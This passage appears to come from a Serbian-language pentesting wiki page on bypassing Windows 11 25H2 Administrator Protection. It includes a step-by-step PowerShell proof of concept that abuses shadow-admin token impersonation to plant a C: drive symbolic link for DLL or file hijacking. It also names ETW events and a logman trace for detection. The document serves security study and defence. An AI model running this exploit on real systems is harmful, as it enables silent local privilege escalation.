
Za kompletnu površinu napada `RAiLaunchAdminProcess` / UIAccess na preview build-ovima Windows 11 25H2, pogledajte posvećenu stranicu:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 „Administrator Protection“ koristi shadow-admin tokene sa mapama `\Sessions\0\DosDevices/<LUID>` po sesiji. Direktorijum se kreira lazy pomoću `SeGetTokenDeviceMap` pri prvom razrešavanju `\??`. Ako napadač impersonira shadow-admin token samo na nivou **SecurityIdentification**, direktorijum se kreira tako da je napadač **owner** (nasleđuje `CREATOR OWNER`), što omogućava linkove slovnih označivača diskova koji imaju prednost nad `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Koraci:**

1. Iz sesije sa niskim privilegijama pozovite `RAiProcessRunOnce` da pokrenete shadow-admin `runonce.exe` bez prompta.
2. Duplirajte njegov primarni token u **identification** token i impersonirajte ga prilikom otvaranja `\??`, kako biste primorali kreiranje `\Sessions\0\DosDevices/<LUID>` uz vlasništvo napadača.
3. Kreirajte `C:` symlink koji pokazuje na storage pod kontrolom napadača; naknadni pristupi filesystem-u u toj sesiji razrešavaće `C:` ka putanji napadača, čime se omogućava DLL/file hijack bez prompta.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
Na preview hostovima, Administrator Protection beleži odobrenja i neuspehe kao ETW događaje **15031** i **15032** u okviru provajdera `Microsoft-Windows-LUA`. Događaji sadrže SID podnosioca zahteva, putanju aplikacije, ishod, upravljani administratorski nalog i metod autentifikacije, tako da ponovljeni pokušaji eksploatacije ili neuspešno upravljanje korisničkim interfejsom nisu bez telemetrije.<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Kako funkcioniše User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Kolekcija UAC bypass tehnika](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Skener kompatibilnosti i launcher za UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI usvaja AI za generisanje PowerShell backdoor-a](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operacija TrueChaos: 0-Day exploitation protiv meta među vladama jugoistočne Azije](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Zaobilaženje Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – UAC bypass pomoću SilentCleanup task-a](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent, TabTip i Narrator Always Notify bypass metode](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Zaštita administratora](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Pozivanje lokalnih Windows RPC servera iz .NET-a](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte unapređuje CoolClient potpisanim Windows kernel rootkit-om](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
{{#include ../../banners/hacktricks-training.md}}
